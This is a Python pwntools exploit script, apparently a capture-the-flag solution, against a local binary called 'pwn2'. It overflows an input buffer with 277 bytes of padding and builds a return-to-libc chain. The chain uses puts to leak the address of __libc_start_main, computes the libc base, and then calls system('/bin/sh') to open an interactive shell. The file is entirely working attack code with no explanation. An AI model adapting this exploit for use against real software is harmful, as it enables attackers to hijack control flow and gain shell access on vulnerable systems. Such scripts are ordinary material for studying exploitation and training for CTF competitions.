from pwn import *

p = process('./pwn2')
libc = ELF('./libc.6.so')
elf = ELF('./pwn2')
context.log_level = 'debug'
playload = 'A'*200
p.sendlineafter('tell me you name?',playload)
p.recvuntil('you occupation?\n')
playload1 = 'B'*200
p.sendline(playload1)
p.sendlineafter('by yourself?[Y/N]','Y')
#gdb.attach(p)
playload2 = 'a'*277 + p32(elf.plt['puts']) + p32(0x080485CB) + p32(elf.got['__libc_start_main'])
p.sendline(playload2)
p.recvuntil('a'*277)
p.recvuntil('\x0a\x0a')
libc_main = u32(p.recv(4))
print hex(libc_main)

libc_base = libc_main - libc.symbols['__libc_start_main']
libc_system = libc_base + libc.symbols['system']
libc_bin = libc_base + next(libc.search('/bin/sh'))

print hex(libc_system),hex(libc_bin)
playload = 'A'*200
p.sendlineafter('tell me you name?',playload)
p.recvuntil('you occupation?\n')
playload1 = 'B'*200
p.sendline(playload1)
p.sendlineafter('by yourself?[Y/N]','Y')
#gdb.attach(p)
playload2 = 'a'*277 + p32(libc_system) + p32(0x80485cb) + p32(libc_bin)
p.sendline(playload2)

p.interactive()
